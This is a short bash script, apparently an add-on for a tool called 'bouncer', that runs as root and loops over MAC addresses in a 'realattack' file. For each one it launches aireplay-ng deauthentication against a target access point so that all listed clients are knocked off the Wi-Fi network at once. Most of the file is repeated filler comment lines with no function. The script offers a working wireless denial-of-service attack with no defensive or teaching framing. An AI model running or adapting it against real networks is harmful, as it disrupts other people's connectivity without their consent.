#!/bin/bash
#created: 1o/12/2o2o
#extension for bouncer!
#deauth all @ same time! | will use the realattack file generated by validate function.
if [[ ${UID} -ne 0 ]]; then
exit 1
fi
   #1   2   3   4   5   6   7   8   9 
   #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
   #1   2   3   4   5   6   7   8   9
   #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
   #1   2   3   4   5   6   7   8   9 
   #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
   #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
   #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
   #1   2   3   4   5   6   7   8   9
   #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
   #1   2   3   4   5   6   7   8   9 
   #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
   #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
   #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
   #1   2   3   4   5   6   7   8   9
   #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
   #1   2   3   4   5   6   7   8   9 
   #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
   #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
  #1   2   3   4   5   6   7   8   9 
 #1   2   3   4   5   6   7   8   9 
    
    
    enforce4all () {
    cat realattack | cut -d "<" -f 2 | while read mac; do 
    exec sudo xterm -e aireplay-ng --deauth COUNT  -a $MYBSSID -c $mac $wlan0 &
    done
    }
wlan0=$(ip a | grep mon | head -1 | cut -d ":" -f 2)
MYBSSID="00:00:00:00:00:00"

enforce4all




